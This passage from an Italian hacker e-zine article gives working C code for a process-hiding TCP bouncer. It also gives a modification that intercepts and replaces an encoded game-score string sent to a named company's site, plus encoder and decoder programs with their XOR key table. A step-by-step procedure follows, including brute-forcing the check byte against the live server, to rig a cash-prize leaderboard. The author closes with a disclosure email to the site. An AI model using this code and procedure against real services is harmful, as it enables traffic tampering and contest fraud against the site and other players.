+char *strerror(error)
+  int error;
+{
+  if (error > sys_nerr)
+    return undef;
+  return sys_errlist[error];
+}
+#endif
+#define CIAO_PS "bfi_2"
+
+main(argc, argv)
+  int argc;
+  char **argv;
+{
+  int lsock, csock, osock;
+  FILE *cfile;
+  char buf[4096];
+  struct sockaddr_in laddr, caddr, oaddr;
+  int caddrlen = sizeof(caddr);
+  fd_set fdsr, fdse;
+  struct hostent *h;
+  struct servent *s;
+  int nbyt;
+  unsigned long a;
+  unsigned short oport;
+  int i, j, argvlen;
+  char *bfiargv[argc+1];
+  char *fintops = CIAO_PS ;
+
+  if (argc < 4) {
+    fprintf(stderr,"Usage: %s localport remoteport remotehost fakeps\n",argv[0]);
+    return 30;
+  }
+
+  for(i=0; i < argc; i++) {
+    bfiargv[i] = malloc(strlen(argv[i]) + 1);
+    strncpy(bfiargv[i], argv[i], strlen(argv[i]) + 1);
+   }
+  bfiargv[argc] = NULL;
+  argvlen = strlen(argv[0]);
+  if (argvlen < strlen(CIAO_PS)) {
+    printf("Se vuoi fregare davvero ps vedi di lanciarmi almeno come superFunkyDataPipe !\n") ;
+    abort();
+   }
+  if(bfiargv[4]) fintops=bfiargv[4] ;
+  strncpy(argv[0], fintops, strlen(fintops));
+  for(i = strlen(fintops); i < argvlen; i++) argv[0][i] = '\0';
+  for(i=1; i < argc; i++) {
+    argvlen = strlen(argv[i]);
+    for(j=0; j <= argvlen; j++)
+      argv[i][j] = '\0';
+   }
+
+  a = inet_addr(argv[3]);
+  if (!(h = gethostbyname(bfiargv[3])) &&
+      !(h = gethostbyaddr(&a, 4, AF_INET))) {
+    perror(bfiargv[3]);
+    return 25;
+  }
+  oport = atol(bfiargv[2]);
+  laddr.sin_port = htons((unsigned short)(atol(bfiargv[1])));
+  if ((lsock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
+    perror("socket");
+    return 20;
+  }
+  laddr.sin_family = htons(AF_INET);
+  laddr.sin_addr.s_addr = htonl(0);
+  if (bind(lsock, &laddr, sizeof(laddr))) {
+    perror("bind");
+    return 20;
+  }
+  if (listen(lsock, 1)) {
+    perror("listen");
+    return 20;
+  }
+  if ((nbyt = fork()) == -1) {
+    perror("fork");
+    return 20;
+  }
+  if (nbyt > 0) 
+    return 0;
+  setsid();
+  while ((csock = accept(lsock, &caddr, &caddrlen)) != -1) {
+    cfile = fdopen(csock,"r+");
+    if ((nbyt = fork()) == -1) {
+      fprintf(cfile, "500 fork: %s\n", strerror(errno));
+      shutdown(csock,2);
+      fclose(cfile);
+      continue;
+    }
+    if (nbyt == 0)
+      goto gotsock;
+    fclose(cfile);
+    while (waitpid(-1, NULL, WNOHANG) > 0);
+  }
+  return 20;
+
+ gotsock:
+  if ((osock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
+    fprintf(cfile, "500 socket: %s\n", strerror(errno));
+    goto quit1;
+  }
+  oaddr.sin_family = h->h_addrtype;
+  oaddr.sin_port = htons(oport);
+  memcpy(&oaddr.sin_addr, h->h_addr, h->h_length);
+  if (connect(osock, &oaddr, sizeof(oaddr))) {
+    fprintf(cfile, "500 connect: %s\n", strerror(errno));
+    goto quit1;
+  }
+  while (1) {
+    FD_ZERO(&fdsr);
+    FD_ZERO(&fdse);
+    FD_SET(csock,&fdsr);
+    FD_SET(csock,&fdse);
+    FD_SET(osock,&fdsr);
+    FD_SET(osock,&fdse);
+    if (select(20, &fdsr, NULL, &fdse, NULL) == -1) {
+      fprintf(cfile, "500 select: %s\n", strerror(errno));
+      goto quit2;
+    }
+    if (FD_ISSET(csock,&fdsr) || FD_ISSET(csock,&fdse)) {
+      if ((nbyt = read(csock,buf,4096)) <= 0) 
+        goto quit2;
+      if ((write(osock,buf,nbyt)) <= 0)
+        goto quit2;
+    } else if (FD_ISSET(osock,&fdsr) || FD_ISSET(osock,&fdse)) {
+      if ((nbyt = read(osock,buf,4096)) <= 0)
+        goto quit2;       if ((write(csock,buf,nbyt)) <= 0)
+        goto quit2;
+    }
+  }
+
+ quit2:
+  shutdown(osock,2);
+  close(osock);
+ quit1:
+  fflush(cfile);
+  shutdown(csock,2);
+ quit0:
+  fclose(cfile);
+  return 0;
+}
+<-X->
+
+Modifichiamo ora l'ultima parte:
+
+modifica a bouncer.c :
+
+<-| gas/bouncer_mod.c |->
+    if (FD_ISSET(csock,&fdsr) || FD_ISSET(csock,&fdse)) {
+      if ((nbyt = read(csock,buf,4096)) <= 0) 
+        goto quit2;
+
+		//Codice per inserire il nostro PunteggioFake
+
+		sprintf(tmpstr,"Test");
+		
+		k=0;
+		pbuf=&buf[45];		
+		if(strstr(pbuf,"crc=")!=NULL) {
+
+			// MOdalita' FUCKCODE
+			
+			for(i=0;i<nbyt;i++) {
+				
+				if (buf[i] == '=' && k == 0) {
+					tk1 = i;
+					k = 1;
+				}
+				if (buf[i] == 0x20 && k == 1) {
+					tk2 = i;
+					k = 2;
+				}
+				
+			}
+ 			f1=fopen("codice","r");
+			f3=fopen("log2","w");
+			if (f1 != NULL) fgets(fakestr,500,f1); 
+				else sprintf(fakestr,"TEST");
+
+			memcpy(tmpbuf,buf,tk1+1);
+			memcpy(&tmpbuf[tk1+1],fakestr,strlen(fakestr));
+			memcpy(&tmpbuf[tk1+strlen(fakestr)+1],&buf[tk2],nbyt-tk2); 
+			memcpy(tmpstr,&buf[tk1+1],tk2-tk1-1);
+			tmpstr[tk2-tk1-1] = 0;
+
+      			if (f1 != NULL) memcpy(buf,tmpbuf,nbyt);
+			if ((write(osock,buf,nbyt)) <= 0)
+        			goto quit2;
+
+			fprintf(f3,"%s",tmpstr);			
+			if(f1 != NULL) fclose(f1);
+			fclose(f3);
+			
+		} else {
+		
+			if ((write(osock,buf,nbyt)) <=0)
+				goto quit2;
+				
+		}
+
+      if ((write(osock,buf,nbyt)) <= 0)
+        goto quit2;
+    } else if (FD_ISSET(osock,&fdsr) || FD_ISSET(osock,&fdse)) {
+      if ((nbyt = read(osock,buf,4096)) <= 0)
+        goto quit2;
+      if ((write(csock,buf,nbyt)) <= 0)
+        goto quit2;
+    }
+<-X->    
+
+Con questa semplice modifica il simpatico programmetto di FuSyS ci restituisce
+nel file "log2" la stringa codificata e nello stesso tempo, se il file
+"codice" e` presente, sostituisce la stessa stringa con quella presa dal file.
+
+Usare questo tool e` molto semplice. 
+
+./bouncer 666 80 www.gasjeans.it
+
+in questo modo creo un ponte fra il browser, che verra` connesso a
+localhost:666, e la gasjeans. Mentre le informazioni passano il nostro
+programmino si comporta come un normale bouncer e tutto sembra normale.
+Quando passa la stringa criptata il programma entra nella modalita` "FUCKCODE"
+e sostituisce silenziosamente la stringa originale e il punteggio pippa, con
+quella da noi elaborata... il SuperPunteggioDa2000Euro entrera` in classifica
+istantaneamente e senza destare il minimo sospetto!!!
+
+Per elaborare velocemente la stringa ho scritto questi due programmi:
+
+<-| gas/decodalo.c |->
+#include <stdio.h>
+#include "matrix.h"
+
+main () {
+
+	FILE *f1,*f5;
+	
+	int i,totch;
+	unsigned char bufdec[2048];
+	unsigned char bufchr[2048];
+	unsigned char crc;
+	
+	unsigned char c1x;
+	unsigned char c1f;
+	
+	f1 = fopen("log2","r");
+	f5 = fopen("result","w");
+	
+	fgets(bufdec,2000,f1);
+	totch = strlen(bufdec)/3;
+	
+	printf("Decodifica %d %d\n",strlen(bufdec),totch);
+	
+	for(i=0;i<totch;i++) 
+		bufchr[i] = (bufdec[i*3]-0x30)*100+\
+		(bufdec[i*3+1] - 0x30)*10+(bufdec[i*3+2]-0x30);
+			
+	for(i=0;i<8;i++) {
+		fprintf(f5,"%1X",bufchr[i]/16);
+		fprintf(f5,"%1X",bufchr[i]%16);
+	}
+	
+	for(i=8;i<totch;i++) {
+	
+		 c1x = (unsigned char)(bufchr[i] ^ bufchr[i%8]);	
+		
+		 c1f = (c1x ^ xorch[i-8]) + 0x30; 
+		
+		 fprintf(f5,"%c",c1f);
+				
+	}
+	
+	fclose(f1);
+	fclose(f5);
+	
+}
+<-X->
+
+<-| gas/codalo.c |->
+#include <stdio.h>
+#include "matrix.h"
+
+main () {
+
+	FILE *f1,*f5;
+	
+	int i,totch;
+	unsigned char buf[2048];
+	unsigned char bufchr[2048];
+	unsigned char tk1,tk2;
+	
+	unsigned char c1x;
+	unsigned char c1f;
+	
+	f1 = fopen("result","r");
+	f5 = fopen("result2","w");
+	
+	fgets(buf,2000,f1);
+	totch=strlen(buf)-16;
+	
+	printf("Codifica %d\n",totch);
+	
+	for(i=0;i<8;i++) {
+		 if (buf[i*2] > '9') tk1 = 55; else tk1 = 48;
+		 if (buf[i*2+1] > '9') tk2 = 55; else tk2 = 48;
+		 bufchr[i] = (buf[i*2]-tk1)*16+(buf[i*2+1]-tk2);
+		 fprintf(f5,"%1d",bufchr[i]/100);
+		 fprintf(f5,"%1d",bufchr[i]%100/10);
+		 fprintf(f5,"%1d",bufchr[i]%100%10);
+        }
+			
+	for(i=0;i<totch-1;i++) {
+	
+		 c1f = (unsigned char)((buf[i+16]-0x30) ^ xorch[i]);
+		 
+		 bufchr[i+8] = (unsigned char)(c1f ^ bufchr[i%8]);	
+		
+		 fprintf(f5,"%1d",bufchr[i+8]/100);
+		 fprintf(f5,"%1d",bufchr[i+8]%100/10);
+		 fprintf(f5,"%1d",bufchr[i+8]%100%10);
+				
+	}
+	
+	fclose(f1);
+	fclose(f5);
+	
+}
+<-X->
+
+Dove "matrix.h" e` il file che contiene la matrice di permutazione xor...
+ricordate che andra` aggiornata in parte connessione per connessione!!!
+
+<-| gas/matrix.h |->
+unsigned char xorch[200] = \
+		{0x40,0x61,0x3e,0x63,0x52,0x04,0x5c,0x07,\
+		 0x40,0x01,0x5e,0x03,0x52,0x64,0x3c,0x67,\
+		 0x20,0x61,0x3e,0x63,0x52,0x04,0x5c,0x07,\
+		 0x40,0x01,0x5e,0x03,0x52,0x64,0x3c,0x67,\
+		 0x40,0x61,0x5e,0x03,0x52,0x04,0x5c,0x07,\
+		 0x40,0x61,0x3e,0x63,0x32,0x64,0x3c,0x67,\
+		 0x40,0x01,0x5e,0x03,0x52,0x04,0x5c,0x07,\
+		 0x20,0x01,0x5e,0x03,0x52,0x04,0x5c,0x07,\
+		 0x40,0x01,0x3e,0x63,0x52,0x64,0x5c,0x07,\
+		 0x40,0x01,0x5e,0x03,0x52,0x64,0x3c,0x67,\
+		 0x20,0x01,0x3e,0x63,0x32,0x64,0x3c,0x67,\
+		 0x20,0x01,0x3e,0x63,0x32,0x64,0x3c,0x07};
+<-X->
+
+Ora abbiamo tutti gli strumenti. La procedura di attacco e` questa:
+
+	 1) Lancio il bouncer
+	 2) Gioco la prima partita e salvo un punteggio 
+		cretino (sopra i 10000 punti)
+	 3) nel file "log2" mi trovo la stringa codificata
+	 4) la decodifico con ./decodalo
+	 5) guardo dove la matrice di xor sbaglia i numeri e la sistemo
+	 6) ridecodo la stringa senza errori
+	 7) edito la stringa con il nuovo SuperPunteggioDa2000Euro
+	 8) la codifico con ./codalo
+	 
+Ora c'e` un problema grosso... quel cazzo di byte di controllo non lo posso
+precalcolare e la mia stringa non verra` accettata. Come fare? Beh ho notato
+una cosa carina. Via browser e` possibile mandare una stringa codificata al
+server. Esempio:
+
+http://www.gasjeans.it/it/jhtml/community/games/end_game300005.jhtml?\
+	  crc=081226241153063062018044081188246196041121067034017224174\
+	  1560330990260680701782422070905707804301722717021404711102911\
+	  6083183162147109057079045093177254201054110017116083238167146\
+	  105057
+
+Il punteggio non verra` mai salvato, perche` non siamo correttamente
+registrati e il server sa che non abbiamo giocato nessuna partita. Ma c'e` un
+dettaglio interessante: il server risponde come se la stringa fosse autentica
+anche se non salva il risulato! Infatti se e` codificata bene restituisce
+
+"Complimenti sei entrato in classifica"
+
+se invece c'e` qualche problema ritorna con la classica schermata di errore.
+Molto molto bene. La nostra stringa e` corretta fino all'ultimo byte che
+rimane ignoto... ma non ci si mette molto a provare 256 possibilita`!!!!
+
+La nostra stringa da modificare verra` inserita in un ciclo che negli ultimi
+tre caratteri mettera` 000 -> 001 -> 002 finche` non trova in risposta
+"Complimenti..." quello sara` il byte che ci manca!!!!!! Modifichiamo poi il
+nostro file "codice" con quello che ora sappiamo e abbiamo una stringa
+funzionante al 100% pronta per essere spedita...
+
+	 9) inserisco la stringa corretta al 100% nel file "codice"
+	10) gioco una seconda partita
+	11) salvando il punteggio questa volta il bouncer modifica il
+            pacchetto
+	12) Ho diritto a 2000 Euro
+
+	FASE QUATTRO: LA SIGARETTA DELLA VITTORIA
+
+L'azione. Sara` da sfigato emozionarsi per quattro caratteri sparati su un
+monitor... ma non posso farci niente... tutto questo e` troppo divertente.
+
+Stop della musica. Adesso bisogna pensare. Questi sono gli istanti prima del
+punto di non ritorno. Un clik, un enter e quello che e` fatto viene loggato e
+non lo puoi piu` cancellare.
+
+Niente undelete, niente restore... una serie di byte esce dal tuo modem... e
+magari un mese dopo ti trovi la polizia in casa. Cazzo, fai fatica a crederci
+a volte... finche` non ti succede. Sinceramente non voglio che capiti di
+nuovo.
+
+Appena il mio nome sara` in classifica verra` spedita la seguente mail al
+gestore del sito:
+
+TO: info@gasjeans.it
+
+Spettabile GasJeans
+
+	 volevo informarla che per pura curiosita` ho verificato la sicurezza
+	 del gioco on-line PINEBALL presente sul vostro www.gasjeans.it
+
+	 Visto che il punteggio di questo gioco potrebbe far vincere una
+	 discreta quantita` di denaro mi sono chiesto se fosse privo
+	 di imperfezioni tali da permettere ad un malintenzionato di barare.
+
+	 Non e` semplicissimo, ma il sistema di trasmissione delle 
+	 informazioni fra il programma in Flash e il server puo` essere 
+	 manomesso e utilizzato per inserire qualsiasi tipo di punteggio 
+	 in classifica.
+
+	 Puo` controllare che il nickname "JacKMcKraK", da me usato per fare
+	 qualche prova, e` stranamente nella prima posizione... sicuramente
+	 non perche` sono un mago del PINEBALL.
+
+	 Vorrei precisare che non sono entrato nella vostra rete aziendale e
+	 non ho manomesso alcun server.
+
+	 Per ulteriori dettagli tecnici sono reperibile 
+	 a questo indirizzo: mckrak@psynet.net
+
+	 Distinti saluti
+
+		JacK McKrak
+
+Direi che questa lettera e` il minimo. Chiunque pensi che sia piu`
+intelligente stare zitto e rischiare il culo per 2000 Euro di abbigliamento
+e` un coglione.
+
+Ora pero` voglio godermi i risultati.
+
+	./bouncer 666 80 www.gasjeans.it
+
+	Lancio Netscape e mi connetto a localhost:666
+
+	Prima partita: punteggio 12100
+
+	./decodalo
+
+	Sistemo la matrice
+
+	./decodalo
+
+	kedit result -> inserisco il nuovo punteggio
+	
+	file:result
+	084ED9B37A30F770points=300464|id?game=300005|record=300464|backdoor=8843\
+	|port=8814|score=300464|name=JacKMcKraK
+
+	./codalo	
+
+	./findcrc <- punto debole della procedura, molte query al server di
+                     fila... rischio di essere loggato come tentativo di flood
+
+	-> 161
+
+	aggiungo 161 a codice
+	
+	file:codice
+	00807821717912204824711200801622223810811916611607207913118204412024203\
+	50390242142371250571681190720791351811001182540360230132111890430521711\
+	15078075203226121103240035023016197189032060175116004015216242108057163\
+	12707307520324312310723303406907613517604405017505902203021822903707825\
+	0036051050212203106101240161
+
+	Seconda partita
+
+	SAVE RESULT
+
+<<<<<<<<Complimenti sei il primo in classifica !!>>>>>>>>>>>>
+	( screenshot: http://www.s0ftpj.org/archive/pics/gas.jpg )
+
+Ora concedetemi la scena da film. 
+
+Play MP3: Pixies - Where is my mind. Sigaretta. Accendino.
+
+Ok, credo di aver scassato abbastanza...
+
+Alla prossima...
+		
+			JacK McKrak
+
+P.S. Saluto tutti i ragazzi dell'Orda e di S0ftPj. Ave smaster per aver
+concesso spazio a questo delirante articolo sul sito ufficiale S0ftPj e su
+BFi. Un saluto particolare a Infected, la mitica Tsu, Golem, Slay, Eagle1,
+Berry, Jollino, FuSyS, ZetaCool, Nelloz, Koba, Pho... e soprattutto il piccolo
+Pho!
+
+Un grosso grazie anche a mia cugina Gloria per il sostegno morale (ricordati
+che per questa citazione disinteressata mi dovrai presentare quella tua amica
+molto carina)
+
+
+==============================================================================
+---------------------------------[ EOF 3/15 ]---------------------------------
+==============================================================================
+
